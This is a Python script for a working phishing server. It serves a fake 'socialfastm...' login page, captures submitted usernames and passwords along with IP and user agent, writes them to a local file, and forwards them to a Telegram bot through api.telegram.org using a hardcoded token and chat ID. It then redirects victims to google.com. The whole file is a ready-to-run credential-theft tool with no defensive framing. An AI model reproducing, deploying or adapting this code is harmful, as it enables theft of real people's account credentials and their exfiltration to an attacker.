import os
import sys
import time
import json
import requests
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler

# ===== CONFIG =====
PORT = int(os.environ.get("PORT", 8080))
LOG_FILE = "credentials.txt"
TELEGRAM_BOT_TOKEN = "8944122260:AAHqcA2EOzBfaYUcvHjIvKHnkfoGug5VWRg"
TELEGRAM_CHAT_ID = "8594080672"  # <-- မှန်ကန်တဲ့ Chat ID ထည့်ပါ

# ===== EMBEDDED HTML =====
HTML_PAGE = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>socialfastm...</title>
<style>
* { margin:0; padding:0; box-sizing:border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
body { background:#ffffff; display:flex; justify-content:center; align-items:center; min-height:100vh; margin:0; padding:20px; }
.container { width:100%; max-width:380px; text-align:center; }
.header { margin-bottom:40px; }
.header h1 { font-size:28px; font-weight:500; color:#1a1a1a; letter-spacing:-0.3px; }
.header .sub { font-size:16px; color:#777; margin-top:4px; font-weight:400; }
.form-group { margin-bottom:18px; text-align:left; }
.form-group input { width:100%; padding:14px 16px; font-size:16px; border:1px solid #d0d0d0; border-radius:8px; background:#fafafa; outline:none; color:#1a1a1a; transition:border 0.2s; }
.form-group input:focus { border-color:#2b7aff; background:#ffffff; }
.form-group input::placeholder { color:#aaa; font-weight:300; }
.btn-signin { width:100%; padding:14px; font-size:17px; font-weight:600; color:#ffffff; background:#2b7aff; border:none; border-radius:8px; cursor:pointer; transition:background 0.2s; margin-top:4px; }
.btn-signin:hover { background:#1a5fcc; }
.footer { margin-top:24px; font-size:14px; color:#888; }
.footer a { color:#2b7aff; text-decoration:none; font-weight:500; }
.footer a:hover { text-decoration:underline; }
.footer span { margin:0 6px; color:#ccc; }
@media (max-width:480px) { .container { max-width:100%; padding:0 8px; } .header h1 { font-size:24px; } }
</style>
</head>
<body>
<div class="container">
<div class="header">
<h1>socialfastm...</h1>
<div class="sub">@fastmm.com</div>
</div>
<form id="loginForm" action="/login.php" method="POST">
<div class="form-group">
<input type="text" id="username" name="username" placeholder="Username" autocomplete="username" required>
</div>
<div class="form-group">
<input type="password" id="password" name="password" placeholder="Password" autocomplete="current-password" required>
</div>
<button type="submit" class="btn-signin" id="signinBtn">Sign in</button>
</form>
<div class="footer">
<a href="#">Forgot password?</a>
<span>&middot;</span>
<a href="#">Create account</a>
</div>
</div>
<script>
(function() {
'use strict';
const form = document.getElementById('loginForm');
const btn = document.getElementById('signinBtn');
form.addEventListener('submit', function(e) {
const username = document.getElementById('username').value.trim();
const password = document.getElementById('password').value.trim();
if (!username || !password) {
e.preventDefault();
alert('Please fill in both fields.');
return;
}
btn.disabled = true;
btn.textContent = 'Signing in...';
setTimeout(function() {
btn.disabled = false;
btn.textContent = 'Sign in';
}, 3000);
});
})();
</script>
</body>
</html>"""

# ===== TELEGRAM SENDER =====
def send_to_telegram(username, password, ip, user_agent):
    try:
        msg = f"🔐 New Login Credentials\n👤 Username: {username}\n🔑 Password: {password}\n🌐 IP: {ip}\n📱 UA: {user_agent}\n⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        response = requests.get(url, params={"chat_id": TELEGRAM_CHAT_ID, "text": msg}, timeout=5)
        if response.status_code == 200:
            print("[+] Telegram: SUCCESS")
        else:
            print(f"[!] Telegram error: {response.text}")
    except Exception as e:
        print(f"[!] Telegram exception: {e}")

# ===== HTTP HANDLER =====
class PhishingHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        pass
    def do_GET(self):
        if self.path == "/" or self.path == "/index.html":
            self.send_response(200)
            self.send_header("Content-type", "text/html; charset=utf-8")
            self.end_headers()
            self.wfile.write(HTML_PAGE.encode("utf-8"))
        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b"<h1>404 Not Found</h1>")
    def do_POST(self):
        if self.path == "/login.php":
            length = int(self.headers.get("Content-Length", 0))
            data = self.rfile.read(length).decode("utf-8")
            params = {}
            for item in data.split("&"):
                if "=" in item:
                    k, v = item.split("=", 1)
                    params[k] = v.replace("+", " ")
            username = params.get("username", "").strip()
            password = params.get("password", "").strip()
            if username and password:
                ip = self.client_address[0]
                ua = self.headers.get("User-Agent", "Unknown")
                ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                with open(LOG_FILE, "a", encoding="utf-8") as f:
                    f.write(f"[{ts}] IP: {ip} | UA: {ua} | Username: {username} | Password: {password}\n")
                send_to_telegram(username, password, ip, ua)
                print(f"[+] Captured: {username}:{password} from {ip}")
            self.send_response(302)
            self.send_header("Location", "https://www.google.com")
            self.end_headers()
        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b"<h1>404 Not Found</h1>")

# ===== MAIN =====
if __name__ == "__main__":
    print("[+] Server starting...")
    print(f"[+] Port: {PORT}")
    print("[+] Telegram: ENABLED")
    print("[+] HTML: EMBEDDED")
    print("[+] Server running!")
    server = HTTPServer(("0.0.0.0", PORT), PhishingHandler)
    server.serve_forever()
